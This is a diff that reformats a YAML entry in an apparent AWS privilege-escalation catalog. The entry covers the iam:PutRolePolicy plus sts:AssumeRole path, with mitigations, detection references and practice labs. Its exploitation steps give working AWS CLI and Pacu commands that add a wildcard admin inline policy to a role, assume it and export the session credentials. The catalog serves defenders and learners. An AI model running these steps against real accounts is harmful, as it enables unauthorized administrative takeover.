@@ -2,160 +2,150 @@ id: iam-017
 name: iam:PutRolePolicy + sts:AssumeRole
 category: lateral-movement
 services:
-  - iam
-  - sts
-
+- iam
+- sts
 permissions:
   required:
-    - permission: iam:PutRolePolicy
-      resourceConstraints: Must have permission on the target role ARN
-    - permission: sts:AssumeRole
-      resourceConstraints: Must have permission to assume the target role, and the role must trust the attacking principal
+  - permission: iam:PutRolePolicy
+    resourceConstraints: Must have permission on the target role ARN
+  - permission: sts:AssumeRole
+    resourceConstraints: Must have permission to assume the target role, and the role
+      must trust the attacking principal
   additional:
-    - permission: iam:ListRoles
-      resourceConstraints: Helpful for discovering available roles that can be modified and assumed
-    - permission: iam:GetRole
-      resourceConstraints: Useful for viewing role trust policies to identify assumable roles
-    - permission: iam:ListRolePolicies
-      resourceConstraints: Helpful for viewing current inline policies on the target role
-    - permission: iam:GetRolePolicy
-      resourceConstraints: Useful for viewing inline policy details before and after modification
-
-description: This is a variation of `iam:PutRolePolicy` (iam-005). This variation is needed when you have `iam:PutRolePolicy` permission on another role (not your own principal). In this scenario, you cannot directly escalate your own privileges, but you can escalate by modifying a different role and then assuming it. This requires both `iam:PutRolePolicy` on the target role AND `sts:AssumeRole` permission. Critically, the target role must also be configured with a trust policy that explicitly allows your principal to assume it. You add an inline policy with administrative permissions directly to the target role, then assume that role to gain the elevated privileges. Inline policies are embedded directly in IAM roles and are often overlooked during security reviews because they are not visible as standalone policy objects, making this privilege escalation technique less visible than managed policy attachments.
-
+  - permission: iam:ListRoles
+    resourceConstraints: Helpful for discovering available roles that can be modified
+      and assumed
+  - permission: iam:GetRole
+    resourceConstraints: Useful for viewing role trust policies to identify assumable
+      roles
+  - permission: iam:ListRolePolicies
+    resourceConstraints: Helpful for viewing current inline policies on the target
+      role
+  - permission: iam:GetRolePolicy
+    resourceConstraints: Useful for viewing inline policy details before and after
+      modification
+description: This is a variation of `iam:PutRolePolicy` (iam-005). This variation
+  is needed when you have `iam:PutRolePolicy` permission on another role (not your
+  own principal). In this scenario, you cannot directly escalate your own privileges,
+  but you can escalate by modifying a different role and then assuming it. This requires
+  both `iam:PutRolePolicy` on the target role AND `sts:AssumeRole` permission. Critically,
+  the target role must also be configured with a trust policy that explicitly allows
+  your principal to assume it. You add an inline policy with administrative permissions
+  directly to the target role, then assume that role to gain the elevated privileges.
+  Inline policies are embedded directly in IAM roles and are often overlooked during
+  security reviews because they are not visible as standalone policy objects, making
+  this privilege escalation technique less visible than managed policy attachments.
 prerequisites:
   admin:
-    - "A target role must exist that you have `iam:PutRolePolicy` permission on"
-    - "You must have `sts:AssumeRole` permission scoped to the target role"
-    - "**Critical**: The target role must have a trust policy that explicitly allows your principal to assume it (e.g., your user or role ARN must be in the Principal element of the role's trust policy)"
+  - A target role must exist that you have `iam:PutRolePolicy` permission on
+  - You must have `sts:AssumeRole` permission scoped to the target role
+  - '**Critical**: The target role must have a trust policy that explicitly allows
+    your principal to assume it (e.g., your user or role ARN must be in the Principal
+    element of the role''s trust policy)'
   lateral:
-    - "A target role must exist that you have `iam:PutRolePolicy` permission on"
-    - "You must have `sts:AssumeRole` permission scoped to the target role"
-    - "**Critical**: The target role must have a trust policy that explicitly allows your principal to assume it (e.g., your user or role ARN must be in the Principal element of the role's trust policy)"
-
+  - A target role must exist that you have `iam:PutRolePolicy` permission on
+  - You must have `sts:AssumeRole` permission scoped to the target role
+  - '**Critical**: The target role must have a trust policy that explicitly allows
+    your principal to assume it (e.g., your user or role ARN must be in the Principal
+    element of the role''s trust policy)'
 exploitationSteps:
   awscli:
-    - step: 1
-      command: aws iam list-roles --query 'Roles[*].[RoleName,Arn]' --output table
-      description: List all roles to identify targets with trust policies that allow the attacking principal to assume them
-    - step: 2
-      command: aws iam get-role --role-name TARGET_ROLE
-      description: Check the trust policy of a specific role to verify the attacking principal can assume it
-    - step: 3
-      command: aws iam list-role-policies --role-name TARGET_ROLE
-      description: List current inline policies on the target role to verify existing permissions (optional)
-    - step: 4
-      command: |
-        aws iam put-role-policy \
-          --role-name TARGET_ROLE \
-          --policy-name AdminInlinePolicy \
-          --policy-document '{
-            "Version": "2012-10-17",
-            "Statement": [
-              {
-                "Effect": "Allow",
-                "Action": "*",
-                "Resource": "*"
-              }
-            ]
-          }'
-      description: Create an inline policy with administrative permissions and attach it directly to the target role
-    - step: 5
-      command: sleep 15
-      description: Wait for the policy to propagate across AWS infrastructure (typically takes 10-15 seconds)
-    - step: 6
-      command: aws iam list-role-policies --role-name TARGET_ROLE
-      description: Verify the inline policy was successfully attached to the target role (optional)
-    - step: 7
-      command: |
-        aws sts assume-role \
-          --role-arn arn:aws:iam::ACCOUNT_ID:role/TARGET_ROLE \
-          --role-session-name privesc-session
-      description: Assume the target role to gain the elevated permissions from the inline policy
-    - step: 8
-      command: |
-        export AWS_ACCESS_KEY_ID=<AccessKeyId from step 7>
-        export AWS_SECRET_ACCESS_KEY=<SecretAccessKey from step 7>
-        export AWS_SESSION_TOKEN=<SessionToken from step 7>
-      description: Configure the AWS CLI to use the assumed role credentials
-    - step: 9
-      command: aws sts get-caller-identity
-      description: Verify the assumed role identity
-    - step: 10
-      command: aws iam list-users --max-items 3
-      description: Verify administrative access by testing a privileged operation
+  - step: 1
+    command: aws iam list-roles --query 'Roles[*].[RoleName,Arn]' --output table
+    description: List all roles to identify targets with trust policies that allow
+      the attacking principal to assume them
+  - step: 2
+    command: aws iam get-role --role-name TARGET_ROLE
+    description: Check the trust policy of a specific role to verify the attacking
+      principal can assume it
+  - step: 3
+    command: aws iam list-role-policies --role-name TARGET_ROLE
+    description: List current inline policies on the target role to verify existing
+      permissions (optional)
+  - step: 4
+    command: "aws iam put-role-policy \\\n  --role-name TARGET_ROLE \\\n  --policy-name\
+      \ AdminInlinePolicy \\\n  --policy-document '{\n    \"Version\": \"2012-10-17\"\
+      ,\n    \"Statement\": [\n      {\n        \"Effect\": \"Allow\",\n        \"\
+      Action\": \"*\",\n        \"Resource\": \"*\"\n      }\n    ]\n  }'\n"
+    description: Create an inline policy with administrative permissions and attach
+      it directly to the target role
+  - step: 5
+    command: sleep 15
+    description: Wait for the policy to propagate across AWS infrastructure (typically
+      takes 10-15 seconds)
+  - step: 6
+    command: aws iam list-role-policies --role-name TARGET_ROLE
+    description: Verify the inline policy was successfully attached to the target
+      role (optional)
+  - step: 7
+    command: "aws sts assume-role \\\n  --role-arn arn:aws:iam::ACCOUNT_ID:role/TARGET_ROLE\
+      \ \\\n  --role-session-name privesc-session\n"
+    description: Assume the target role to gain the elevated permissions from the
+      inline policy
+  - step: 8
+    command: 'export AWS_ACCESS_KEY_ID=<AccessKeyId from step 7>
+
+      export AWS_SECRET_ACCESS_KEY=<SecretAccessKey from step 7>
+
+      export AWS_SESSION_TOKEN=<SessionToken from step 7>
+
+      '
+    description: Configure the AWS CLI to use the assumed role credentials
+  - step: 9
+    command: aws sts get-caller-identity
+    description: Verify the assumed role identity
+  - step: 10
+    command: aws iam list-users --max-items 3
+    description: Verify administrative access by testing a privileged operation
   pacu:
-    - step: 1
-      command: run iam__enum_permissions
-      description: Enumerate IAM permissions and identify roles that can be modified and assumed
-    - step: 2
-      command: run iam__privesc_scan
-      description: Scan for IAM privilege escalation opportunities including PutRolePolicy + AssumeRole combinations
-    - step: 3
-      command: run iam__put_role_policy --role-name TARGET_ROLE --policy-name AdminInlinePolicy --policy-file admin_policy.json
-      description: Use Pacu to add an inline policy with admin permissions to the target role
-    - step: 4
-      command: run iam__assume_role --role-arn arn:aws:iam::ACCOUNT_ID:role/TARGET_ROLE
-      description: Assume the privileged role using Pacu
+  - step: 1
+    command: run iam__enum_permissions
+    description: Enumerate IAM permissions and identify roles that can be modified
+      and assumed
+  - step: 2
+    command: run iam__privesc_scan
+    description: Scan for IAM privilege escalation opportunities including PutRolePolicy
+      + AssumeRole combinations
+  - step: 3
+    command: run iam__put_role_policy --role-name TARGET_ROLE --policy-name AdminInlinePolicy
+      --policy-file admin_policy.json
+    description: Use Pacu to add an inline policy with admin permissions to the target
+      role
+  - step: 4
+    command: run iam__assume_role --role-arn arn:aws:iam::ACCOUNT_ID:role/TARGET_ROLE
+    description: Assume the privileged role using Pacu
+limitations: 'This path provides administrative access only if the inline policy includes
+  administrative permissions. The attacker gains whatever permissions are specified
+  in the inline policy they create. However, even limited additional permissions may
+  enable multi-hop attacks.
 
-limitations: |
-  This path provides administrative access only if the inline policy includes administrative permissions. The attacker gains whatever permissions are specified in the inline policy they create. However, even limited additional permissions may enable multi-hop attacks.
-
-recommendation: |
-  To prevent this privilege escalation path:
-
-  **1. Restrict inline policy management permissions:**
-  Limit `iam:PutRolePolicy`, `iam:PutUserPolicy`, and `iam:PutGroupPolicy` to only trusted administrators. These permissions allow direct modification of principal permissions without the visibility of managed policies.
-
-  **2. Implement least privilege for role assumption:**
-  Only grant `sts:AssumeRole` permission to principals that have a legitimate business need to assume specific roles. Use resource-level restrictions to limit which roles can be assumed:
-  ```json
-  {
-    "Effect": "Allow",
-    "Action": "sts:AssumeRole",
-    "Resource": "arn:aws:iam::ACCOUNT_ID:role/SpecificAllowedRole"
-  }
-  ```
-
-  **3. Use SCPs to prevent inline policy creation:**
-  Deploy Service Control Policies (SCPs) that deny `iam:Put*Policy` actions for sensitive roles, even if IAM permissions allow it:
-  ```json
-  {
-    "Version": "2012-10-17",
-    "Statement": [
-      {
-        "Effect": "Deny",
-        "Action": [
-          "iam:PutRolePolicy",
-          "iam:PutUserPolicy",
-          "iam:PutGroupPolicy"
-        ],
-        "Resource": [
-          "arn:aws:iam::*:role/SensitiveRole*",
-          "arn:aws:iam::*:user/PrivilegedUser*"
-        ]
-      }
-    ]
-  }
-  ```
-
-  **4. Monitor inline policy changes:**
-  Configure AWS CloudTrail alerts for `PutRolePolicy`, `PutUserPolicy`, and `PutGroupPolicy` API calls. These are high-risk actions that should be rare and closely monitored.
-
-  **5. Prefer managed policies over inline policies:**
-  Managed policies are more visible in security reviews and easier to audit. Consider blocking inline policy creation entirely for production environments.
-
-  **6. Implement permission boundaries:**
-  Use IAM permission boundaries on roles to set the maximum permissions that can be granted, even through inline policies.
-
-  **7. Regular audits:**
-  Periodically audit all roles for inline policies, especially those with sensitive trust policies. Inline policies are less visible than managed policies and may be overlooked.
-
-discoveredBy:
-  name: "Spencer Gietzen"
-  organization: "Rhino Security Labs"
-  date: "2018"
-
+  '
+recommendation: "To prevent this privilege escalation path:\n\n**1. Restrict inline\
+  \ policy management permissions:**\nLimit `iam:PutRolePolicy`, `iam:PutUserPolicy`,\
+  \ and `iam:PutGroupPolicy` to only trusted administrators. These permissions allow\
+  \ direct modification of principal permissions without the visibility of managed\
+  \ policies.\n\n**2. Implement least privilege for role assumption:**\nOnly grant\
+  \ `sts:AssumeRole` permission to principals that have a legitimate business need\
+  \ to assume specific roles. Use resource-level restrictions to limit which roles\
+  \ can be assumed:\n```json\n{\n  \"Effect\": \"Allow\",\n  \"Action\": \"sts:AssumeRole\"\
+  ,\n  \"Resource\": \"arn:aws:iam::ACCOUNT_ID:role/SpecificAllowedRole\"\n}\n```\n\
+  \n**3. Use SCPs to prevent inline policy creation:**\nDeploy Service Control Policies\
+  \ (SCPs) that deny `iam:Put*Policy` actions for sensitive roles, even if IAM permissions\
+  \ allow it:\n```json\n{\n  \"Version\": \"2012-10-17\",\n  \"Statement\": [\n  \
+  \  {\n      \"Effect\": \"Deny\",\n      \"Action\": [\n        \"iam:PutRolePolicy\"\
+  ,\n        \"iam:PutUserPolicy\",\n        \"iam:PutGroupPolicy\"\n      ],\n  \
+  \    \"Resource\": [\n        \"arn:aws:iam::*:role/SensitiveRole*\",\n        \"\
+  arn:aws:iam::*:user/PrivilegedUser*\"\n      ]\n    }\n  ]\n}\n```\n\n**4. Monitor\
+  \ inline policy changes:**\nConfigure AWS CloudTrail alerts for `PutRolePolicy`,\
+  \ `PutUserPolicy`, and `PutGroupPolicy` API calls. These are high-risk actions that\
+  \ should be rare and closely monitored.\n\n**5. Prefer managed policies over inline\
+  \ policies:**\nManaged policies are more visible in security reviews and easier\
+  \ to audit. Consider blocking inline policy creation entirely for production environments.\n\
+  \n**6. Implement permission boundaries:**\nUse IAM permission boundaries on roles\
+  \ to set the maximum permissions that can be granted, even through inline policies.\n\
+  \n**7. Regular audits:**\nPeriodically audit all roles for inline policies, especially\
+  \ those with sensitive trust policies. Inline policies are less visible than managed\
+  \ policies and may be overlooked.\n"
 discoveryAttribution:
   firstDocumented:
     author: Spencer Gietzen
@@ -164,120 +154,115 @@ discoveryAttribution:
     link: https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/
   derivativeOf:
     pathId: iam-005
-    modification: "Combines iam:PutRolePolicy with sts:AssumeRole for lateral movement to another role (requires trust policy configuration)"
-
+    modification: Combines iam:PutRolePolicy with sts:AssumeRole for lateral movement
+      to another role (requires trust policy configuration)
 references:
-  - title: "AWS IAM Privilege Escalation Methods and Mitigation"
-    url: "https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/"
-  - title: "AWS-IAM-Privilege-Escalation - Method 12: Creating/updating an inline policy for a role"
-    url: "https://github.com/RhinoSecurityLabs/AWS-IAM-Privilege-Escalation"
-  - title: "HackTricks - AWS - IAM Privesc"
-    url: "https://cloud.hacktricks.wiki/en/pentesting-cloud/aws-security/aws-privilege-escalation/aws-iam-privesc/index.html#iamattachrolepolicy--stsassumeroleiamcreaterole--iamputuserpolicy--iamputgrouppolicy--iamputrolepolicy"
-  - title: "IAM Vulnerable - Privesc12 (IAM-PutRolePolicy)"
-    url: "https://github.com/BishopFox/iam-vulnerable"
-  - title: "AWS IAM Privilege Escalation Techniques - Hacking the Cloud"
-    url: "https://hackingthe.cloud/aws/exploitation/iam_privilege_escalation/"
-  - title: "Investigating Privilege Escalation Methods in AWS"
-    url: "https://bishopfox.com/blog/privilege-escalation-in-aws"
-
+- title: AWS IAM Privilege Escalation Methods and Mitigation
+  url: https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/
+- title: 'AWS-IAM-Privilege-Escalation - Method 12: Creating/updating an inline policy
+    for a role'
+  url: https://github.com/RhinoSecurityLabs/AWS-IAM-Privilege-Escalation
+- title: HackTricks - AWS - IAM Privesc
+  url: https://cloud.hacktricks.wiki/en/pentesting-cloud/aws-security/aws-privilege-escalation/aws-iam-privesc/index.html#iamattachrolepolicy--stsassumeroleiamcreaterole--iamputuserpolicy--iamputgrouppolicy--iamputrolepolicy
+- title: IAM Vulnerable - Privesc12 (IAM-PutRolePolicy)
+  url: https://github.com/BishopFox/iam-vulnerable
+- title: AWS IAM Privilege Escalation Techniques - Hacking the Cloud
+  url: https://hackingthe.cloud/aws/exploitation/iam_privilege_escalation/
+- title: Investigating Privilege Escalation Methods in AWS
+  url: https://bishopfox.com/blog/privilege-escalation-in-aws
 relatedPaths:
-  - iam-001
-  - iam-005
-  - iam-007
-  - iam-012
-  - iam-014
-  - iam-016
-
+- iam-001
+- iam-005
+- iam-007
+- iam-012
+- iam-014
+- iam-016
 detectionTools:
-  cloudsplaining: https://github.com/salesforce/cloudsplaining/blob/master/cloudsplaining/shared/constants.py#L125
-  pacu: https://github.com/RhinoSecurityLabs/pacu/blob/master/pacu/modules/iam__privesc_scan/main.py#L618
-  prowler: https://github.com/prowler-cloud/prowler/blob/master/prowler/providers/aws/services/iam/lib/privilege_escalation.py#L108-L109
-
+  cloudsplaining: https://github.com/salesforce/cloudsplaining/blob/7f82e7ab0a1a714d20a69b1d0b892e4702754e6b/cloudsplaining/shared/constants.py#L124
+  pacu: https://github.com/RhinoSecurityLabs/pacu/blob/50e7ad2d885b7ab4bc130f44b798ca85ed4d7a91/pacu/modules/iam__privesc_scan/main.py#L185
+  prowler: https://github.com/prowler-cloud/prowler/blob/49c75cc4180e2304747d8fe4bd1b16dd38929d07/prowler/providers/aws/services/iam/lib/privilege_escalation.py#L92
 detectionRules:
-  - platform: CloudTrail
-    ruleId: PutRolePolicy-Monitoring
-    url: https://docs.aws.amazon.com/awscloudtrail/latest/userguide/cloudtrail-event-reference.html
-
+- platform: CloudTrail
+  ruleId: PutRolePolicy-Monitoring
+  url: https://docs.aws.amazon.com/awscloudtrail/latest/userguide/cloudtrail-event-reference.html
 learningEnvironments:
   pathfinder-labs:
     type: open-source
     githubLink: https://github.com/DataDog/pathfinder-labs
-    scenario: "privesc-one-hop/to-admin/iam-putrolepolicy+sts-assumerole"
-    description: "Deploy Terraform into your own AWS account to practice this attack path"
+    scenario: privesc-one-hop/to-admin/iam-putrolepolicy+sts-assumerole
+    description: Deploy Terraform into your own AWS account to practice this attack
+      path
   iam-vulnerable:
     type: open-source
     githubLink: https://github.com/BishopFox/iam-vulnerable
-    scenario: "IAM-PutRolePolicy"
-    description: "Deploy Terraform into your own AWS account and practice individual exploitation paths"
+    scenario: IAM-PutRolePolicy
+    description: Deploy Terraform into your own AWS account and practice individual
+      exploitation paths
   cybr:
     type: closed-source
-    description: "Hosted learning environment with interactive AWS security labs"
+    description: Hosted learning environment with interactive AWS security labs
     scenario: https://cybr.com/courses/iam-privilege-escalation-labs/lessons/lab-ctf-iamputrolepolicy-privesc/
     scenarioPricingModel: paid
-
 toolSupport:
   pmapper: true
   iamVulnerable: true
   pacu: true
   prowler: false
-
 attackVisualization:
   nodes:
-    - id: start
-      label: Starting Principal
-      type: principal
-      description: |
-        The principal initiating the attack. Can be an IAM user or role with both `iam:PutRolePolicy` permission on a target role and `sts:AssumeRole` permission on that same role. The attacker uses these permissions to add an inline policy with administrative permissions to the target role, then assumes it to gain elevated privileges.
+  - id: start
+    label: Starting Principal
+    type: principal
+    description: 'The principal initiating the attack. Can be an IAM user or role
+      with both `iam:PutRolePolicy` permission on a target role and `sts:AssumeRole`
+      permission on that same role. The attacker uses these permissions to add an
+      inline policy with administrative permissions to the target role, then assumes
+      it to gain elevated privileges.
 
-    - id: target_role
-      label: Existing Target Role
-      type: principal
-      description: |
-        An IAM role that the starting principal can modify with inline policies and assume. The role must have a trust policy that allows the starting principal to assume it. The attacker adds an inline policy with administrative permissions directly to this role using `iam:PutRolePolicy`, which embeds the policy document within the role itself (unlike customer-managed policies which are separate resources).
+      '
+  - id: target_role
+    label: Existing Target Role
+    type: principal
+    description: 'An IAM role that the starting principal can modify with inline policies
+      and assume. The role must have a trust policy that allows the starting principal
+      to assume it. The attacker adds an inline policy with administrative permissions
+      directly to this role using `iam:PutRolePolicy`, which embeds the policy document
+      within the role itself (unlike customer-managed policies which are separate
+      resources).
 
-    - id: admin
-      label: Effective Administrator
-      type: outcome
-      description: |
-        Full administrative access to the AWS account. The attacker achieves this by first using `iam:PutRolePolicy` to add an inline policy with administrative permissions to the target role, then using `sts:AssumeRole` to assume that role and gain the elevated privileges. The assumed role credentials provide full administrative access to the AWS environment.
+      '
+  - id: admin
+    label: Effective Administrator
+    type: outcome
+    description: 'Full administrative access to the AWS account. The attacker achieves
+      this by first using `iam:PutRolePolicy` to add an inline policy with administrative
+      permissions to the target role, then using `sts:AssumeRole` to assume that role
+      and gain the elevated privileges. The assumed role credentials provide full
+      administrative access to the AWS environment.
 
+      '
   edges:
-    - from: start
-      to: target_role
-      label: iam:PutRolePolicy
-      description: |
-        The attacker uses `iam:PutRolePolicy` to add an inline policy with administrative permissions directly to the target role.
-
-        Command:
-        ```bash
-        aws iam put-role-policy \
-          --role-name target-role-name \
-          --policy-name AdminInlinePolicy \
-          --policy-document file://admin_policy.json
-        ```
-
-        Where admin_policy.json contains a policy document granting full administrative access (e.g., `"Action": "*"`, `"Resource": "*"`). Unlike customer-managed policies, inline policies are embedded directly in the IAM entity (in this case, the role) and take effect immediately. The role instantly gains these elevated permissions.
-
-    - from: target_role
-      to: admin
-      label: sts:AssumeRole
-      description: |
-        The attacker uses `sts:AssumeRole` to assume the target role, which now has administrative permissions via the newly added inline policy.
-
-        Command:
-        ```bash
-        aws sts assume-role \
-          --role-arn "arn:aws:iam::ACCOUNT_ID:role/target-role-name" \
-          --role-session-name "privesc-session"
-        ```
-
-        The API returns temporary security credentials (AccessKeyId, SecretAccessKey, SessionToken) that have full administrative access. Configure these credentials in the AWS CLI or SDK to perform administrative actions:
-
-        ```bash
-        export AWS_ACCESS_KEY_ID=<AccessKeyId>
-        export AWS_SECRET_ACCESS_KEY=<SecretAccessKey>
-        export AWS_SESSION_TOKEN=<SessionToken>
-
-        # Verify administrative access
-        aws iam list-users
-        ```
+  - from: start
+    to: target_role
+    label: iam:PutRolePolicy
+    description: "The attacker uses `iam:PutRolePolicy` to add an inline policy with\
+      \ administrative permissions directly to the target role.\n\nCommand:\n```bash\n\
+      aws iam put-role-policy \\\n  --role-name target-role-name \\\n  --policy-name\
+      \ AdminInlinePolicy \\\n  --policy-document file://admin_policy.json\n```\n\n\
+      Where admin_policy.json contains a policy document granting full administrative\
+      \ access (e.g., `\"Action\": \"*\"`, `\"Resource\": \"*\"`). Unlike customer-managed\
+      \ policies, inline policies are embedded directly in the IAM entity (in this\
+      \ case, the role) and take effect immediately. The role instantly gains these\
+      \ elevated permissions.\n"
+  - from: target_role
+    to: admin
+    label: sts:AssumeRole
+    description: "The attacker uses `sts:AssumeRole` to assume the target role, which\
+      \ now has administrative permissions via the newly added inline policy.\n\n\
+      Command:\n```bash\naws sts assume-role \\\n  --role-arn \"arn:aws:iam::ACCOUNT_ID:role/target-role-name\"\
+      \ \\\n  --role-session-name \"privesc-session\"\n```\n\nThe API returns temporary\
+      \ security credentials (AccessKeyId, SecretAccessKey, SessionToken) that have\
+      \ full administrative access. Configure these credentials in the AWS CLI or\
+      \ SDK to perform administrative actions:\n\n```bash\nexport AWS_ACCESS_KEY_ID=<AccessKeyId>\n\
+      export AWS_SECRET_ACCESS_KEY=<SecretAccessKey>\nexport AWS_SESSION_TOKEN=<SessionToken>\n\
+      \n# Verify administrative access\naws iam list-users\n```\n"
